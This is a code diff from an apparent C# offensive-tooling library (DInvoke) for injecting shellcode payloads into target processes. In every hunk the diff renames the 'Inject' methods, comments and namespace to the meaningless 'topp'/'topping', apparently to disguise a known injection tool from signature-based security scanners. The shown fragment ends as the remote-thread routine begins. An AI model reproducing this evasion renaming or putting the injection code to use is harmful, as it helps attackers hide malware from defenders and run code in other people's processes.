@@ -29,24 +29,24 @@ namespace DInvokeResolver.DInvoke.topping
         abstract internal void DefineSupportedPayloadTypes();
 
         /// <summary>
-        /// Inject and execute a payload in the target process using a specific allocation technique.
+        /// topp and execute a payload in the target process using a specific allocation technique.
         /// </summary>
         /// <author>The Wover (@TheRealWover)</author>
         /// <param name="Payload">The type of payload to execute.</param>
         /// <param name="AllocationTechnique">The allocation technique to use.</param>
         /// <param name="Process">The target process.</param>
         /// <returns>bool</returns>
-        public bool Inject(PayloadType Payload, AllocationTechnique AllocationTechnique, Process Process)
+        public bool topp(PayloadType Payload, AllocationTechnique AllocationTechnique, Process Process)
         {
             Type[] funcPrototype = new Type[] { Payload.GetType(), AllocationTechnique.GetType(), Process.GetType() };
 
             try
             {
-                // Get delegate to the overload of Inject that supports the type of payload passed in
-                MethodInfo inject = this.GetType().GetMethod("Inject", funcPrototype);
+                // Get delegate to the overload of topp that supports the type of payload passed in
+                MethodInfo topp = this.GetType().GetMethod("topp", funcPrototype);
 
                 // Dynamically invoke the appropriate Allocate overload
-                return (bool)inject.Invoke(this, new object[] { Payload, AllocationTechnique, Process });
+                return (bool)topp.Invoke(this, new object[] { Payload, AllocationTechnique, Process });
             }
             // If there is no such method
             catch (ArgumentNullException)
@@ -63,17 +63,17 @@ namespace DInvokeResolver.DInvoke.topping
         /// <param name="BaseAddress">The base address of the payload.</param>
         /// <param name="Process">The target process.</param>
         /// <returns>bool</returns>
-        public virtual bool Inject(PayloadType Payload, IntPtr BaseAddress, Process Process)
+        public virtual bool topp(PayloadType Payload, IntPtr BaseAddress, Process Process)
         {
             Type[] funcPrototype = new Type[] { Payload.GetType(), BaseAddress.GetType(), Process.GetType() };
 
             try
             {
-                // Get delegate to the overload of Inject that supports the type of payload passed in
-                MethodInfo inject = this.GetType().GetMethod("Inject", funcPrototype);
+                // Get delegate to the overload of topp that supports the type of payload passed in
+                MethodInfo topp = this.GetType().GetMethod("topp", funcPrototype);
 
                 // Dynamically invoke the appropriate Allocate overload
-                return (bool)inject.Invoke(this, new object[] { Payload, BaseAddress, Process });
+                return (bool)topp.Invoke(this, new object[] { Payload, BaseAddress, Process });
             }
             // If there is no such method
             catch (ArgumentNullException)
@@ -89,17 +89,17 @@ namespace DInvokeResolver.DInvoke.topping
         /// <param name="Payload">The type of payload to execute.</param>
         /// <param name="AllocationTechnique">The allocation technique to use.</param>
         /// <returns></returns>
-        public virtual bool Inject(PayloadType Payload, AllocationTechnique AllocationTechnique)
+        public virtual bool topp(PayloadType Payload, AllocationTechnique AllocationTechnique)
         {
             Type[] funcPrototype = new Type[] { Payload.GetType(), AllocationTechnique.GetType() };
 
             try
             {
-                // Get delegate to the overload of Inject that supports the type of payload passed in
-                MethodInfo inject = this.GetType().GetMethod("Inject", funcPrototype);
+                // Get delegate to the overload of topp that supports the type of payload passed in
+                MethodInfo topp = this.GetType().GetMethod("topp", funcPrototype);
 
                 // Dynamically invoke the appropriate Allocate overload
-                return (bool)inject.Invoke(this, new object[] { Payload, AllocationTechnique });
+                return (bool)topp.Invoke(this, new object[] { Payload, AllocationTechnique });
             }
             // If there is no such method
             catch (ArgumentNullException)
@@ -172,10 +172,10 @@ namespace DInvokeResolver.DInvoke.topping
             };
         }
 
-        public bool Inject(PICPayload Payload, AllocationTechnique AllocationTechnique, Process Process)
+        public bool topp(PICPayload Payload, AllocationTechnique AllocationTechnique, Process Process)
         {
             IntPtr baseAddr = AllocationTechnique.Allocate(Payload, Process);
-            return Inject(Payload, baseAddr, Process);
+            return topp(Payload, baseAddr, Process);
         }
 
         /// <summary>
@@ -184,9 +184,9 @@ namespace DInvokeResolver.DInvoke.topping
         /// <author>The Wover (@TheRealWover)</author>
         /// <param name="Payload">The shellcode payload to execute in the target process.</param>
         /// <param name="BaseAddress">The address of the shellcode in the target process.</param>
-        /// <param name="Process">The target process to inject into.</param>
+        /// <param name="Process">The target process to topp into.</param>
         /// <returns></returns>
-        public bool Inject(PICPayload Payload, IntPtr BaseAddress, Process Process)
+        public bool topp(PICPayload Payload, IntPtr BaseAddress, Process Process)
         {
             IntPtr threadHandle = new IntPtr();
             Data.Native.NTSTATUS result = Data.Native.NTSTATUS.Unsuccessful;
